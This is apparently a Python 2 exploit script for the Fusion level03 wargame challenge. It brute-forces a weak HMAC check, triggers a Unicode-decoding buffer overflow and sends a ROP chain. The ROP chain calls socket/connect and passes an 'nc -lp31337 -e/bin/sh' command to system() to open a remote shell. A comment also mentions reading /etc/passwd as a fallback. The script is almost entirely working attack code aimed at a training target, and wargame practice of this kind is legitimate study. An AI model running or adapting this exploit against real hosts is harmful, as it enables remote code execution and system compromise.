#!/usr/bin/env python
#
# http://exploit-exercises.com/fusion/level03
#
# NOTE: If you want to debug level03 you need to 'set follow-fork-mode child'
#	under gdb (after attaching to specific PID).
#
# There are 2 mistakes in this example:
#   (1) When calculating MAC for incoming data the application checks only first
#   two characters, hence it's prone to a brute-force attack
#   (2) When procesing Unicode characters in decode_string() they update dest
#   ptr twice which breaks '!=' check of the loop, leading to the overflow in
#   handle_resuest() function
#
# P.S.
# Time truly flies by. I've paused at EIP control on August 2014 and here we are
# in 2016, 3 months away from August.
#

import sys
import socket
import struct
import hmac
import hashlib
import random
from string import ascii_uppercase, ascii_lowercase, digits

def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    token = s.recv(1024)
    print "[+] Got token: " + token
    token = token.replace("\"", "")
    token = token.replace("\n", "")

    # NOTE: Our requests cannot contain standard NULLs, instead you need to pass
    # NULLs encoded in Unicode (0x00000000 => \\\u0000\\\u0000)

    # We will use title to smuggle argument for system()
    title = "\"title\":\""
    title += "nc -lp31337 -e/bin/sh\\\u0000"
    title += "\","

    # And contents for triggering vulnerability and delivering ROP chain
    contents = "\"contents\":\""
    contents += 'A'*1023
    contents += "\\\\u1337" # Unicode that breaks the IF check
    contents += 'B'*159

    contents += struct.pack("<I", 0x08048e40) # initial RET to socket() @ plt

    # NOTE: Old trick with server interaction will not work here because they
    # close all descriptors explicitly. However, this binary exposes network
    # functionality and we will exploit it to make a reverse shell.
    #
    # NOTE: Since stdin/stdout/stderr were closed new descriptors will take
    # their place, hence the return value of socket() is predictable.
    # !!! DOUBLE CHECK THAT (already have, so triple!) !!!
    #
    # If reverse shell won't work we can open socket, initiate connection, open
    # file descriptor with /etc/passwd and send it to our socket descriptor.
    # weak but still is good enough to finally finish this challenge. ffs.

    # Frame 0
    contents += struct.pack("<I", 0x0804a26d) # RET to pop-pop-pop-ret
    contents += "\\\u0100\\\u0000" # socket()'s 1st arg (AF_INET)
    contents += "\\\u0100\\\u0000" # socket()'s 2nd arg (SOCK_STREAM)
    contents += "\\\u0000\\\u0000" # socket()'s 3rd arg
    contents += struct.pack("<I", 0x8048c40) # connect() @ plt

    # Frame 1
    contents += struct.pack("<I", 0x0804a26d) # RET to pop-pop-pop-ret
    contents += "\\\u0000\\\u0000" # connect()'s 1st arg (predicted descriptor)
    contents += struct.pack("<I", 0x0804be04) # connect()'s 2nd arg (addr to gTitle)
    contents += "\\\u1600\\\u0000"
    contents += struct.pack("<I", 0x41424344)

    contents += '"'

    json = "{" + title + contents + "}"

    # That reminds me of http://wiibrew.org/wiki/Signing_bug
    print "[+] Brute-forcing proper bytes in SHA-1"
    while(1):
        blob = ''.join(random.choice(ALPHABET) for _ in range(32))

        payload = token + '\n' + json + '\n' + blob

        sha1 = hmac.new(token, payload, hashlib.sha1).digest()
        if(sha1[0] == '\0' and sha1[1] == '\0'):
            break

    print "[+] Sending payload: " + payload
    s.send(payload) # Boom goes the dynamite!

    s.close()

if __name__ == "__main__":
    if(len(sys.argv) < 2):
        print sys.argv[0] + " <IP>"
        sys.exit(1)
    HOST = sys.argv[1]
    PORT = 20003
    ALPHABET = ascii_uppercase + ascii_lowercase + digits

    main()

